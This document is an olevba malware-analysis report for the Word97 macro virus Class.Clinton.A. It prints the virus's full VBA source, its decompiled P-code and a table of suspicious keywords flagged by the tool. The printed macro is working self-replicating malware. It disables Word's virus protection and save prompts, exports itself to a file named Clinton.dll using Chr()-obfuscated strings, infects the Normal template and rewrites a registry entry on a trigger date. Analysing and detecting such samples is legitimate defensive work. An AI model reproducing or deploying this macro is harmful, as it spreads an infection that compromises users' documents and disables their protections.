olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo done

Options.VirusProtection = Chr(48): x = 0: vx = 1: xv = 4: zz = 2

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

Clintons = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

Clintonr = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

If Clintonr > 70 And Clintons > Sgn(x) Then GoTo done

If Clintonr < 70 Then

    Set Monica = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

    ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Name = Monica.Name

    ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(67) + Chr(108) + Chr(105) + Chr(110) + Chr(116) + Chr(111) + Chr(110) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

End If

If Clintons = Sgn(x) Then Set Monica = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

Infect = Int(Rnd * 100)

If Infect = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

If Month(Now()) > 8 And Day(Now()) = 17 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "Class Clinton Document"

Monica.codemodule.AddFromFile Windows.Application.Path & Chr(67) + Chr(108) + Chr(105) + Chr(110) + Chr(116) + Chr(111) + Chr(110) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

With Monica.codemodule

    For j = Abs(vx) To Abs(xv)

    .deletelines Abs(vx)

    Next j

End With

If Clintonr < 70 Then

    With Monica.codemodule

    .replaceline Abs(vx), "Sub AutoClose()"

    .replaceline 75, "Sub ToolsMacro()"

    End With

End If

With Monica.codemodule

    For j = Abs(zz) To 72 Step Abs(zz)

    .replaceline j, Chr(39) & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version

    Next j

End With

done:

If Clintonr > 70 And Clintons = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()

End Sub 'Word97/Class.Clinton.A by Virus ;) Smile
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.bk
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4628 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	OnError done 
' Line #3:
' Line #4:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St x 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St vx 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	St xv 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St zz 
' Line #5:
' Line #6:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St Clintons 
' Line #11:
' Line #12:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St Clintonr 
' Line #13:
' Line #14:
' 	Ld Clintonr 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld Clintons 
' 	Ld x 
' 	FnSgn 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo done 
' 	EndIf 
' Line #15:
' Line #16:
' 	Ld Clintonr 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #17:
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Monica 
' Line #19:
' Line #20:
' 	Ld Monica 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' Line #22:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Ld Clintons 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Monica 
' 	EndIf 
' Line #27:
' Line #28:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St Infect 
' Line #29:
' Line #30:
' 	Ld Infect 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #31:
' Line #32:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Gt 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "Class Clinton Document"
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CLASSES_ROOT\Word.Document.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #33:
' Line #34:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld Monica 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #35:
' Line #36:
' 	StartWithExpr 
' 	Ld Monica 
' 	MemLd codemodule 
' 	With 
' Line #37:
' Line #38:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld vx 
' 	FnAbs 
' 	Ld xv 
' 	FnAbs 
' 	For 
' Line #39:
' Line #40:
' 	Ld vx 
' 	FnAbs 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #41:
' Line #42:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' Line #44:
' 	EndWith 
' Line #45:
' Line #46:
' 	Ld Clintonr 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #47:
' Line #48:
' 	StartWithExpr 
' 	Ld Monica 
' 	MemLd codemodule 
' 	With 
' Line #49:
' Line #50:
' 	Ld vx 
' 	FnAbs 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #51:
' Line #52:
' 	LitDI2 0x004B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #53:
' Line #54:
' 	EndWith 
' Line #55:
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	StartWithExpr 
' 	Ld Monica 
' 	MemLd codemodule 
' 	With 
' Line #59:
' Line #60:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld zz 
' 	FnAbs 
' 	LitDI2 0x0048 
' 	Ld zz 
' 	FnAbs 
' 	ForStep 
' Line #61:
' Line #62:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	Ld Application 
' 	MemLd DisplayRecentFiles 
' 	Concat 
' 	Ld Application 
' 	MemLd FocusInMailHeader 
' 	Concat 
' 	Ld Application 
' 	MemLd Build 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Application 
' 	MemLd Version 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #63:
' Line #64:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' Line #66:
' 	EndWith 
' Line #67:
' Line #68:
' 	Label done 
' Line #69:
' Line #70:
' 	Ld Clintonr 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld Clintons 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #71:
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Sub ViewVBCode())
' Line #75:
' Line #76:
' 	EndSub 
' 	QuoteRem 0x0008 0x0028 "Word97/Class.Clinton.A by Virus ;) Smile"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

